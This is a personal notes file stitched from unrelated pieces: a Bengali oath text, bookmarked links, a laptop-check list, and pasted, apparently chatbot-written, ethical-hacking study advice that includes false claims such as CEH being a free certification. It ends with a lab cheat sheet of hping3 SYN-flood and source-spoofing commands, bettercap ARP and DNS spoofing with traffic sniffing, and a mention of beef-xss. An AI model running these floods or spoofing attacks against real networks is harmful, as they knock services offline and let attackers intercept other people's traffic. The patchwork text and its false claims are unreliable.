ধন্যবাদ









সাধারণ নাগরিক শপথ

বিসমিল্লাহির রাহমানির রাহিম

আমি খাইরুল হাসান রাকিব, 
স্বসদ্য চিত্তে শপথ গ্রহণ করিতেছি যে, আমি আইন অনুযায়ী অন্তরবর্তীকালীন সরকারের সাধারণ নাগরিক হিসেবে কর্তব্য বিশ্বস্ত্যতার সহিত পালন করিব। 

আমি...
বাংলাদেশের প্রতি অকৃত্রিম বিশ্বাস ও আনুগত্য পোষণ করিব। 

আমি...
সংবিধানের রক্ষণ, সমর্থন ও নিরাপত্তাবিধান করিব। এবং আমি ভিতি বা অনুগ্রহ, অনুরাগ বা বিরাগের বশবর্তী না হইয়া সকলের প্রতি আইন অনুযায়ী যথাবিহিত আচরণ করিব। 

গোপনীয়তার শপথ

আমি...
স্বসদ্য চিত্তে শপথ করিতেছি যে, অন্তরবর্তীকালীন সরকারের সাধারণ নাগরিক রূপে যে সকল বিষয় আমার বিবেচনার জন্য আনিত হইবে বা যে সকল বিষয় আমি অবগত হইবো, তাহা সাধারণ নাগরিক রূপে যথাযথ ভাবে আমার কর্তব্য পালনের প্রয়োজনীয়তা ব্যতীত প্রত্যক্ষ বা পরোক্ষ ভাবে কোন ব্যক্তিকে জ্ঞাপন করিব না বা কোন ব্যক্তির নিকট প্রকাশ করিব না।

ধন্যবাদ। 




https://excalidraw.com/
https://www.ybifoundation.org/
https://www.enggroom.com/
https://missionwired.com/
https://www.docusign.com/
https://walmart.converge.tech/content/converge/en_in/sparkathon.html
https://github.com/codecrafters-io/build-your-own-x
https://github.com/jwasham/coding-interview-university
https://github.com/imrk51/CEH-v11-Study-Guide
https://github.com/t3l3machus/toxssin
https://github.com/emrekybs/Pip-Intel
https://github.com/TarlogicSecurity/BlueSpy



https://informationisbeautiful.net/
https://informationisbeautiful.net/visualizations/worlds-biggest-data-breaches-hacks/
https://www.ada.cx/
https://chat-e2ee-2.azurewebsites.net
coda.io/@khairul-hasan-rakib

Laptop Check
1. powercfg/batteryreport
2. Memory Diagnostic
3. CrystalDiskInfo
4. HW monitor




Welcome to our cybersecurity course! I'm excited to help you learn about this fascinating and rapidly evolving field.

What is Cybersecurity?

Cybersecurity is the practice of protecting computer systems, networks, and sensitive information from unauthorized access, use, disclosure, disruption, modification, or destruction. This includes protection against malware, viruses, trojans, ransomware, and other types of cyber threats.

Why is Cybersecurity Important?

Cybersecurity is crucial in today's digital age because it helps protect our personal and sensitive information from falling into the wrong hands. A cybersecurity breach can result in identity theft, financial loss, and damage to our reputation.

What are the Risks of Poor Cybersecurity?

The risks of poor cybersecurity are numerous, including:

Identity theft
Financial loss
Data breaches
Malware and ransomware attacks
Denial of service (DoS) attacks
Phishing and social engineering attacks
What Can You Do to Improve Your Cybersecurity?

To improve your cybersecurity, you can:

Use strong and unique passwords
Enable two-factor authentication (2FA)
Keep your software and operating system up to date
Use antivirus software and a firewall
Be cautious when clicking on links or downloading attachments from unknown sources
Use a virtual private network (VPN) when using public Wi-Fi
Types of Cybersecurity Threats

There are several types of cybersecurity threats, including:

Malware: software designed to harm or exploit a computer system
Ransomware: a type of malware that demands payment in exchange for restoring access to encrypted data
Phishing: a type of social engineering attack that tricks users into revealing sensitive information
Denial of service (DoS) attacks: a type of attack that overwhelms a computer system or network with traffic
SQL injection: a type of attack that exploits vulnerabilities in database management systems
Cybersecurity Best Practices

To stay safe online, remember the following cybersecurity best practices:

Keep your software up to date: Regularly update your operating system, browser, and other software to ensure you have the latest security patches.
Use strong and unique passwords: Use a combination of characters, numbers, and special characters to create strong and unique passwords for each account.
Enable two-factor authentication (2FA): Add an extra layer of security to your accounts by requiring a second form of verification, such as a code sent to your phone or a biometric scan.
Be cautious when clicking on links or downloading attachments: Avoid clicking on suspicious links or downloading attachments from unknown sources, as they may contain malware or be phishing attempts.
Use a virtual private network (VPN): Use a VPN when using public Wi-Fi to encrypt your internet traffic and protect your data.
Now, let's get more specific about what you'd like to learn about cybersecurity. Here are some options:

Network Security: Learn about the different types of network attacks and how to protect your network from them.
Cloud Security: Understand the risks and best practices for securing your cloud-based data and applications.
Malware and Ransomware: Learn about the different types of malware and ransomware attacks and how to protect yourself from them.
Phishing and Social Engineering: Understand the tactics used by attackers to trick you into revealing sensitive information and how to avoid falling victim to these attacks.
Cybersecurity Careers: Explore the different career paths available in cybersecurity and learn about the skills and education required to succeed in this field.
Which of these topics interests you the most?

I want to learn ethical hacking very deeply. Ethical Hacking For Free?


Ethical hacking is a fascinating field that requires a deep understanding of computer systems, networks, and security measures. I'll provide you with a comprehensive resource to learn ethical hacking for free.

What is Ethical Hacking?

Ethical hacking, also known as penetration testing or white-hat hacking, is the practice of testing a computer system, network, or web application to find vulnerabilities and weaknesses that an attacker could exploit. Ethical hackers use their skills to identify and report security issues, helping organizations to strengthen their defenses and improve their overall security posture.

Why Learn Ethical Hacking?

Learning ethical hacking can be a rewarding and challenging career path. Here are some reasons why:

Job prospects: The demand for skilled ethical hackers is high, and the job market is expected to grow in the coming years.
Competitive salary: Ethical hackers are highly compensated, with salaries ranging from $80,000 to over $150,000 per year.
Variety of career paths: Ethical hacking is a broad field, and you can choose from various specializations, such as penetration testing, security consulting, or incident response.
Opportunity to make a difference: As an ethical hacker, you'll have the chance to make a positive impact on an organization's security and help protect its assets and data.
Free Resources to Learn Ethical Hacking

Here are some excellent free resources to learn ethical hacking:

Cybrary's Ethical Hacking Course: This comprehensive course covers the basics of ethical hacking, including vulnerability scanning, exploitation, and penetration testing.
Hack The Box: Hack The Box is an online platform that offers a variety of challenges and exercises to help you learn ethical hacking skills.
OWASP: OWASP (Open Web Application Security Project) is a non-profit organization that provides a wealth of resources and information on web application security, including tutorials, guides, and tools.
GNUCITIZEN: GNUCITIZEN is a non-profit organization that provides free resources and tutorials on various topics, including ethical hacking, penetration testing, and security.
Free online certifications: You can earn free online certifications in ethical hacking, such as the CEH (Certified Ethical Hacker) certification, which is offered by EC-Council.
Books to Learn Ethical Hacking

Here are some excellent books to learn ethical hacking:

"The Hacker's Handbook" by Hugo Cornwall and Steve Gold: This book provides a comprehensive guide to hacking and penetration testing.
"Ethical Hacking and Countermeasures" by Eddie Koch: This book covers the basics of ethical hacking and provides practical examples and exercises.
"Penetration Testing: A Hands-On Introduction to Hacking" by Georgia Weidman: This book provides a hands-on introduction to penetration testing and ethical hacking.
"Hacking: The Art of Exploitation" by Jon Erickson: This book provides a comprehensive guide to hacking and exploitation techniques.
Practice and Join Online Communities

To become a skilled ethical hacker, you need to practice what you've learned. Here are some tips to get you started:

Join online communities: Join online forums and communities, such as Reddit's netsec community, to connect with other hackers and learn from their experiences.
Participate in bug bounty programs: Participate in bug bounty programs, such as HackerOne or Bugcrowd, to practice your skills and earn rewards.
Create your own lab: Set up your own lab environment to practice penetration testing and ethical hacking techniques.
Attend webinars and conferences: Attend webinars and conferences to learn from industry experts and network with other hackers.
Remember, learning ethical hacking takes time and practice. Be patient, persistent, and always follow the laws and regulations of your country.

Next Steps

Now that you have a better understanding of ethical hacking, here are some next steps to consider:

Start with the basics: Learn the fundamentals of computer systems, networks, and security measures.
Practice with online challenges: Participate in online challenges and exercises to practice your skills.
Join online communities: Connect with other hackers and learn from their experiences.
Consider taking a certification course: Earn a certification in ethical hacking, such as the CEH certification, to demonstrate your skills and knowledge.
I hope this helps you get started on your journey to becoming an ethical hacker!


































Welcome to the Ultimate Guide to Ethical Hacking!

As an aspiring ethical hacker, you're about to embark on an exciting journey to learn the skills and knowledge required to become a professional in this field. In this comprehensive guide, we'll cover the entire roadmap, resources, and tutorials to help you get started with ethical hacking, all for free!

What is Ethical Hacking?

Ethical hacking, also known as white-hat hacking, is the practice of using computer skills to test and secure computer systems and networks. Ethical hackers use their skills to find and fix vulnerabilities and weaknesses in systems before they can be exploited by malicious hackers, also known as black-hat hackers.

Why Learn Ethical Hacking?

Job Opportunities: The demand for ethical hackers is on the rise, and with it comes a plethora of career opportunities.
Personal Growth: Learning ethical hacking can help you develop valuable skills, such as problem-solving, critical thinking, and creativity.
Cybersecurity Awareness: By learning about ethical hacking, you'll gain a deeper understanding of cybersecurity threats and how to protect yourself and others from them.
Ethical Hacking Roadmap

Here's a step-by-step roadmap to help you get started with ethical hacking:

Phase 1: Fundamentals
Learn the Basics: Understand the fundamentals of computer systems, networks, and operating systems.
Programming Skills: Learn programming languages, such as Python, C++, or Java.
Networking Fundamentals: Learn about networking protocols, such as TCP/IP, DNS, and DHCP.
Phase 2: Learning Resources
Online Courses:
TryHackMe: A platform offering a wide range of free and paid courses on ethical hacking.
HackTheBox: A platform providing hands-on experience with virtual machines and real-world scenarios.
Coursera: A massive open online course (MOOC) platform offering courses on cybersecurity and ethical hacking.
Tutorials and Guides:
Cybrary: A platform offering free and paid tutorials on cybersecurity and ethical hacking.
Hackers Academy: A platform providing tutorials and guides on various aspects of ethical hacking.
GitHub: A platform hosting open-source projects and tutorials on ethical hacking.
Phase 3: Practice and Projects
Set up a Lab: Create a virtual lab environment to practice and experiment with different scenarios.
Participate in Bug Bounty Programs: Join bug bounty programs to gain hands-on experience and earn rewards.
Contribute to Open-Source Projects: Contribute to open-source projects to gain experience and build your portfolio.
Phase 4: Certifications and Advanced Topics
Certified Ethical Hacker (CEH): Obtain the CEH certification to demonstrate your expertise and knowledge.
Advanced Topics: Learn about advanced topics, such as penetration testing, vulnerability assessment, and incident response.
Free Resources and Tutorials

Here are some free resources and tutorials to get you started:

TryHackMe: A platform offering a wide range of free and paid courses on ethical hacking.
HackTheBox: A platform providing hands-on experience with virtual machines and real-world scenarios.
Cybrary: A platform offering free and paid tutorials on cybersecurity and ethical hacking.
Hackers Academy: A platform providing tutorials and guides on various aspects of ethical hacking.
GitHub: A platform hosting open-source projects and tutorials on ethical hacking.
Conclusion

Learning ethical hacking requires dedication, persistence, and a willingness to learn. By following this roadmap, you'll be well on your way to becoming a professional in this field. Remember to always practice safely and responsibly, and never engage in malicious activities.

What do you want to learn about next?

Phase 1: Fundamentals
Phase 2: Learning Resources
Phase 3: Practice and Projects
Phase 4: Certifications and Advanced Topics
Free Resources and Tutorials
Something else


https://youtu.be/lujANEhHVXI
https://www.quora.com/What-is-the-fastest-road-map-to-learn-ethical-hacking
https://medium.com/@safwan.appu5094/ethical-hacking-roadmap-ab8d3cdc81d9
https://www.knowledgehut.com/blog/security/ethical-hacking-learning-path
https://www.geeksforgeeks.org/ethical-hacking-tutorial/
https://medium.com/@ghmustafame/ethical-hacking-roadmap-2024-b87de12b0c37
https://youtu.be/Ototxz1tbIo
https://www.theknowledgeacademy.com/blog/ethical-hacking-roadmap/
https://www.simplilearn.com/ethical-hacking-course-free-beginners-skillup









http://94.237.57.131:46534/



hping3

attact- 192.168.56.102
target- 192.168.56.103

ping <target-ip>
nmap <target ip>
note: port, state, service

hping3

hping3 --scan 1-65535 <target ip>
hping3 --scan 1-65535 <target ip> -S --rand-source
hping3 -S <attackers ip> -a <target ip> -p <port> --flood
hping3 -c 100000 -d 100000 -S -p <port> --flood --rand-source <target ip>
hping3 <target ip> --data 100000000
hping3 -S -d 50000 --flood <target ip>
hping3 <target ip> --flood --rand-source --data 100000000
hping3 -S <target ip> -a <target ip> -k -s <port> -p <port> --flood




bettercap
net.probe on
net.show
set arp.spoof.targets <ip>
arp.spoof on
net.sniff on

net.sniff off
set dns.spoof.domains <my.com>
dns.spoof on


service apache2 start
service apache2 stop

beef-xss
